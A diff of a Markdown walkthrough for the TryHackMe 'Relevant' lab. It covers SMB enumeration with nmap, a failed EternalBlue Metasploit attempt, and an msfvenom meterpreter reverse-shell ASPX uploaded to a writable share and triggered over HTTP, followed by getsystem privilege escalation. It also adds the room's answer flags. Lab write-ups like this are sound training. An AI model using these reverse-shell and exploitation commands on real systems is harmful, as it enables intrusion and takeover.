@@ -80,6 +80,20 @@ We have found a few open ports with different services, let's try to find some v
 
 ## SMB Service Enumeration
 
+Firstly we'll try using the SMB enum scripts that Nmap has to offer<br />
+```shell
+nmap -p 139,445 -Pn -script smb-enum* 10.10.39.76
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT7.png?raw=true)<br />
+Interesting, we have read/write access on this share... We'll try to use that to exploit the service if we can't find anything else.<br />
+
+Let's do the same thing but with the SMB vuln scripts to see if there are any vulnerabilities.<br />
+```shell
+nmap -p 139,445 -Pn -script smb-vuln* 10.10.39.76
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT6.png?raw=true)<br />
+Bingo! It looks like the SMB server is vulnerable to MS17-010. We'll enumerate more then exploit this!<br />
+
 Let's have a look at the SMB service, we'll try to list the shares on the system to see if we can access anything.<br />
 ```shell
 smbclient -L 10.10.39.76
@@ -98,12 +112,7 @@ get passwords.txt
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT4.png?raw=true)<br />
 Inside we see two passwords that have been encoded... Looks like Base64 to me, let's try decoding them!<br />
 
-Awesome! We have two accounts now, but we have nowhere to use them... Let's use Nmap to see if the SMB is vulnerable.<br />
-```shell
-nmap -p 139,445 -Pn -script smb-vuln* 10.10.39.76
-```
-![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT6.png?raw=true)<br />
-Bingo! It looks like the SMB server is vulnerable to MS17-010. Let's try to exploit the vulnerability.<br />
+Awesome! We have two accounts now.<br />
 
 #Exploitation
 
@@ -119,20 +128,72 @@ Once we have Metasploit open we're going to select the module to use and then se
 use exploit/windows/smb/ms17_010_eternalblue
 show options
 set RHOSTS 10.10.39.76
+set SMBUser Bill
+set SMBPass Juw4nnaM4n420696969!$$$
 exploit
 ```
+... Damn that didn't work... Nevermind let's try something else!<br />
+
+## Exploiting SMB Permissions
+
+Earlier when we performed our Nmap scan with default scripts enabled, we saw that we had read/write permissions on the nt4wrksv share. Let's create a reverse shell with msfvenom.<br />
+```shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.153.77 LPORT=4444 -f aspx > shell.aspx
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT8.png?raw=true)<br />
+Now let's upload it to the SMB share.
+```shell
+smbclient \\\\10.10.39.76\\nt4wrksv
+put shell.aspx
+```
+Before getting the shell to run, we'll need to start our meterpreter reverse_tcp listener! Let's load up Metasploit to do this.<br />
+```
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.153.77
+set LPORT 4444
+exploit
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT9.png?raw=true)<br />
+Now we have our listener, let's run the shell. We head over to our web browser and execute the shell.<br />
+```shell
+http://10.10.39.76:49663/nt4wrksv/shell.aspx
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT10.png?raw=true)<br />
+Success! Now we have our reverse meterpreter shell. (The target box crashed so I had to restart it, it's a new IP if you didn't notice.)<br />
+
+## Escalating Privileges
+
+Let's check what user we're on and then spawn a shell and check our privileges.<br />
+```shell
+getuid
+shell
+whoami /priv
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT11.png?raw=true)<br />
+Interesting... SeImpersonatePrivilege is enabled. We can use meterpreter to automatically elevate our privileges.<br />
+
+Let's close our shell with Ctrl+C and use meterpreter to execute the following<br />
+```shell
+getsystem
+getuid
+```
+Awesome! We have successfully elevated our privileges. Let's get the root flag and complete the box.<br />
+```shell
+cd C:/Users/Administrator/Desktop
+cat root.txt
+```
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Relevant/screenshots/SCREENSHOT12.png?raw=true)<br />
 
 
 ## Questions & Answers
 
-Bob - !P@$$W0rD!123
-Bill - Juw4nnaM4n420696969!$$$
-
 Question 1:<br />
-**What is the user flag?** <br />
+**What is the user flag?** THM{fdk4ka34vk346ksxfr21tg789ktf45}<br />
 
 Question 2:<br />
-**What is the root flag?** <br />
+**What is the root flag?** THM{1fk5kf469devly1gl320zafgl345pv}<br />
 
 ### Farewell, I hope you all enjoyed this write-up!
 
